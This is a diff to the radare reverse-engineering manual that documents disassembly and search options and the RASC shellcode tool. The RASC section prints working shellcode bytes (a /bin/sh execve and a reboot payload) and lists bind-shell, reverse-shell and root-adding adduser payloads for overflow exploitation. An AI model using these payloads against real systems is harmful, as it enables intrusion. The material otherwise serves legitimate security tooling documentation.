@@ -732,14 +732,59 @@ It is possible to print various packed data types in a single line using the 'pm
 
 \H{print-code}
 
+The 'pd' command is the one used to disassemble code, it accepts a numeric value to specify how many opcodes are wanted to be disassembled. The 'pD' one acts in the same way, but using a number-of-bytes instead of counting instructions.
+
 \c  d : disassembly N opcodes   count of opcodes
 \c  D : asm.arch disassembler   bsize bytes
 
-TODO
+TODO: explain :pd 2  ; nun-verbose printage
 
 \S{print-code-arch}
 
-TODO: Selecting the architecture asm.arch
+The architecture flavour for the disassembly is defined by the 'asm.arch' eval variable. Here's a list of all the supported architectures:
+
+\c [0xB7F08810]> eval asm.arch = arm
+\c
+\c Supported values:
+\c intel
+\c intel16
+\c intel32
+\c intel64
+\c x86
+\c mips
+\c arm
+\c arm16
+\c java
+\c sparc
+\c ppc
+\c m68k
+\c csr
+\c msil
+
+\S{print-code-config}
+
+There are multiple options that can be used to configure the output of the disassembly
+
+\c asm.comments = true    ; show/hide comments
+\c asm.cmtmargin = 27     ; comment margins
+\c asm.cmtlines = 0       ; max number of comment lines (0=unlimit)
+\c asm.offset = true      ; show offsets
+\c asm.reladdr = false    ; show relative addresses
+\c asm.nbytes = 8         ; max number of bytes per opcode
+\c asm.bytes = true       ; show bytes
+\c asm.flags = true       ; show flags
+\c asm.flagsline = false  ; show flags in a new line
+\c asm.functions = true   ; show function closures
+\c asm.lines = true       ; show jump/call lines
+\c asm.nlines = 6         ; max number of jump lines
+\c asm.lineswide = true   ; use wide jump lines
+\c asm.linesout = false   ; show jmp lines that go outside the block
+\c asm.linestyle = false  ; use secondary jump line style
+\c asm.trace = false      ; show opcode trace information
+\c asm.os = linux         ; used for syscall resolution and so
+\c asm.split = true       ; split end blocks by lines
+\c asm.splitall = false   ; split all blocks by lines
+\c asm.size = false       ; show size of opcode
 
 \S{print-code-syntax}
 
@@ -951,7 +996,6 @@ We can use the compare command against a file previously dumped to disk from the
 \c [0x08048000]> cf /bin/true
 \c Compare 512/512 equal bytes
 
-
 \C{visual-mode} Visual mode
 
 The visual mode is a user-friendlier interface for the commandline prompt of radare which accepts HJKL movement keys, a cursor for selecting bytes and some keybindings to ease the use of the debugger.
@@ -1096,6 +1140,23 @@ Sometimes while working long time in the same file you will need to launch the l
 
 \c [0x00000f2a]> //     ; repeat last search
 
+\H{search-config} Configurating the searchs
+
+The search engine can be configured by the 'eval' interface:
+
+\c [0x08048000]> eval search.
+\c search.from = 0
+\c search.to = 0
+\c search.align = 0
+\c search.flag = true
+\c search.verbose = true
+
+The search.[from|to] is used to define the offset range limits for the searches.
+
+'search.align' variable is used to determine that the only 'valid' search hits must have to fit in this alignement. For example. you can use 'e search.align=4' to get only the hits found in 4-byte aligned addresses.
+
+The 'search.flag' boolean variable makes the engine setup flags when finding hits. If the search is stopped by the user with a ^C then a 'search_stop' flag will be added.
+
 \H{search-pattern} Pattern search
 
 The search command allows you to throw repeated pattern searchs against the IO backend to be able to identify repeated sequences of bytes without specifying them. The only property to perform this search is to manually define the minimum length of these patterns.
@@ -1110,13 +1171,38 @@ The output of the command will show the different patterns found and how many ti
 
 TODO (not yet implemented)
 
-\H{search-binmask} Binary masks
-
-TODO
-
 \H{search-multiple} Multiple keywords
 
-TODO: ranges, keyword management
+To define multiple keywords you should use the '/k' command which accepts a string with hexa scaped characters. Here's an example of use:
+
+\c [0x08048000]> /k0 lib
+\c [0x08048000]> /k1 rt
+\c [0x08048000]> /k      ; list introduced keywords
+\c 00 lib
+\c 01 rt
+
+To search these two keywords just use the '/r' (ranged search) command:
+
+\c [0x08048000]> /r 0-1
+\c 001  0x00000135  hit0_0 lib/ld-linux.so.2
+\c 002  0x00000b71  hit0_1 librt.so.1__gmon_st
+\c 003  0x00000b74  hit1_2 rt.so.1__gmon_start
+\c ...
+
+\H{search-binmask} Binary masks
+
+In the same way you setup keywords to search it is possible to define binary masks for each of them with the '/m' command. Here's an example of use:
+
+\c [0x08048000]> /k0 lib
+\c [0x08048000]> /m0 ff 00 00
+\c [0x08048000]> /m
+\c 0 ff 00 00
+\c [0x08048000]> /k
+\c 00 lib
+
+Now just use '/r 0' to launch the k0 keyword with the associated m0 binary mask and get the 3-byte hit starting by an 'l' because 'il' is ignored by the binary mask.
+
+This case is quite stupid, but if you work with JPEGs or on ARM for example, you can type more fine-grained binary masks to collect some bits from certain headers or just get the opcodes matching a certain conditional.
 
 \H{search-filerules} Search using rules file
 
@@ -1337,6 +1423,7 @@ In this way it is possible to perform any action in the core just formatting com
 
 \S{jmphacks} Jump hacks
 
+TODO: needs to be rewritten into a plugin (outside the core)
 TODO: nop N opcodes, invert jump, force jump... !jmp and !call
 
 \S{langs} Language bindings
@@ -1457,9 +1544,13 @@ It generates a malloc-ed buffer which grows when receiving data from the socket 
 
 TODO
 
-\H{net-connect} TCP remoting
+\H{net-connect} Radare remote
 
 TODO
+
+\S{net-protocol} Remote protocol
+
+TODO: 
 
 \H{net-sysproxy} IO thru Syscall proxying
 
@@ -1596,11 +1687,94 @@ In the same way as rasm assembler works, giving the '-d' flag you can disassembl
 
 \C{rasc} Rasc
  
-Radare ShellCodes
+RASC stands for 'Radare ShellCodes' and aims to be a tool to be used to develop and automatize the use of simple shellcodes and buffer/heap overflow attacks on controlled environments.
 
 \H{rasc-shellcodes} Shellcodes
 
-TODO
+Rasc contains a database of small shellcodes for multiple operating systems and so..it is useful for fast exploiting on controlled environments. You can get the list with the '-L' flag. Choose it with the '-i' flag.
+
+You can also specify your own shellcode in hexpairs with the '-s' flag or just get it from a raw binary file with the '-S' one.
+
+The return address can be specified with '-a' so you will not have to manually rewrite the return address for multiple tests.
+
+\c $ rasc -h | grep addr
+\c   -a addr@off  set the return address at a specified offset
+\c
+\c $ rasc -N 20 -i x86.freebsd.reboot -x -a 0x8048404@2
+\c 90 90 04 84 04 08 90 90 90 90 90 90 90 90 90 90 90 90 90 90 41 31 c0 50 b0 37 cd 80 
+
+The supported output formats are:
+
+\c   -c           output in C format
+\c   -e           output in escapped string
+\c   -x           output in hexpairs format
+\c   -X           execute shellcode
+
+Some of these shellcodes can be modified by environment variables:
+
+\c  Environment variables to compile shellcodes:
+\c   CMD          Command to execute on execves
+\c   HOST         Host to connect
+\c   PORT         Port to listen or connect
+
+\c $ rasc -i x86.linux.binsh -x
+\c 41 31 c0 50 68 2f 2f 73 68 68 2f 62 69 6e 89 e3 50 53 89 e1 99 b0 0b cd 80 
+\c
+\c $ rasc -L
+\c arm.linux.binsh        47   Runs /bin/sh
+\c arm.linux.suidsh       67   Setuid and runs /bin/sh
+\c arm.linux.bind        203   Binds /bin/sh to a tcp port
+\c armle.osx.reverse     151   iPhone reverse connect shell to HOST and PORT
+\c dual.linux.binsh       99   x86/ppc MacOSX /bin/sh shellcode
+\c dual.osx.binsh        121   Runs /bin/sh (works also on x86) (dual)
+\c mips.linux.binsh       87   Runs /bin/sh (tested on loongson2f).
+\c ppc.osx.adduser       219   Adds a root user named 'r00t' with no pass.
+\c ppc.osx.binsh         152   Executes /bin/sh
+\c ppc.osx.binsh0         72   Executes /bin/sh (with zeroes)
+\c ppc.osx.bind4444      224   Binds a shell at port 4444
+\c ppc.osx.reboot         28   Reboots the box
+\c ppc.bsd.binsh         119   Runs /bin/sh
+\c sparc.linux.binsh     216   Runs /bin/sh on sparc/linux
+\c sparc.linux.bind4444  232   Binds a shell at TCP port 4444
+\c ia64.linux.binsh       63   Executes /bin/sh on Intel Itanium
+\c x64.linux.binsh        46   Runs /bin/sh on 64 bits
+\c x86.bsd.binsh          46   Executes /bin/sh
+\c x86.bsd.binsh2         23   Executes /bin/sh
+\c x86.bsd.suidsh         31   Setuid(0) and runs /bin/sh
+\c x86.bsd.bind4444      104   Binds a shell at port 4444
+\c x86.bsdlinux.binsh     38   Dual linux/bsd shellcode runs /bin/sh
+\c x86.freebsd.reboot      7   Reboots target box
+\c x86.freebsd.reverse   126   Reboots target box
+\c x86.linux.adduser      88   Adds user 'x' with password 'y'
+\c x86.linux.bind4444    109   Binds a shell at TCP port 4444
+\c x86.linux.binsh        24   Executes /bin/sh
+\c x86.linux.binsh1       31   Executes /bin/sh
+\c x86.linux.binsh2       36   Executes /bin/sh
+\c x86.linux.binsh3       50   Executes /bin/sh or CMD
+\c x86.linux.udp4444     125   Binds a shell at UDP port 4444
+\c x86.netbsd.binsh       68   Executes /bin/sh
+\c x86.openbsd.binsh      23   Executes /bin/sh
+\c x86.openbsd.bind6969  147   Executes /bin/sh
+\c x86.osx.binsh          45   Executes /bin/sh
+\c x86.osx.binsh2         24   Executes /bin/sh
+\c x86.osx.bind4444      112   Binds a shell at port 4444
+\c x86.solaris.binsh      84   Runs /bin/sh
+\c x86.solaris.binshu     84   Runs /bin/sh (toupper() safe)
+\c x86.solaris.bind4444  120   Binds a shell at port 4444
+\c x86.w32.msg           245   Shows a MessageBox
+\c x86.w32.cmd           164   Runs cmd.exe and ExitThread
+\c x86.w32.adduser       224   Adds user 'x' with password 'y'
+\c x86.w32.bind4444      345   Binds a shell at port 4444
+\c x86.w32.tcp4444       312   Binds a shell at port 4444
+
+\H{rasc-sc-mods} Paddings
+
+The shellcode can be easily modified to have different prefixes and suffixes to ease the debugging of the exploit development. These flags are:
+
+\c -A [n]       prefix shellcode with N A's (0x41)
+\c -N [n]       prefix shellcode with N nops (0x90)
+\c -C [n]       suffix shellcode with N traps
+\c -E [n]       prefix with enumeration 01 02 03..
 
 \H{rasc-sysproxy} Syscall proxying
 
@@ -2749,7 +2923,11 @@ You can change visualize and change the signal handlers of the target process:
 
 \C{script} Scripting
 
-TODO
+TODO: explain
+
+\C{script-remote} Remote API
+
+TODO: explain radapy here
 
 \H{rsc-scripts} Radare scripts
 
@@ -2773,14 +2951,16 @@ I would like to greet some drugs, drinks and people that shared his life with mi
 
 \u - God. aka Flying Spaguetti Monster
 
-\u - Laia
+\u - Lia
 
 \u - nopcode guys
 
 \u - Sexy Pandas
 
-\u - Gerardo
+\u - Gerardo (ideas and tips for the book)
 
-\u - Esteve
+\u - Esteve (search engine+some code graph stuff)
 
-\u - Nibble
+\u - Nibble (ELF32/64 and PE parser+some core work)
+
+\u - revenge (OSX debugger+mach0 work)
